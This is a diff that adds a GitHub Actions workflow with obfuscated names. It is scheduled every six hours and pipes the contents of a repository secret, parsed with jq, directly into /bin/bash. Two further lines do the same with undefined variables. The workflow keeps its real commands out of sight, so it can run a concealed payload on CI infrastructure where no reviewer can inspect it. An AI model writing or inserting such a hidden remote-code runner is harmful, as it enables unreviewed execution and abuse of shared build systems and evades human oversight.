@@ -1,0 +1,19 @@
+name: zonxxki
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zonxxki
+        env:
+          ajaxy4444: ${{ secrets.ajaxy4444 }}
+        run: |
+          echo $ajaxy4444 | jq -r .jvtr610 | /bin/bash
+          echo $ene7614 | jq -r .si0329 | /bin/bash
+          echo $z6968 | jq -r .qw41 | /bin/bash
+
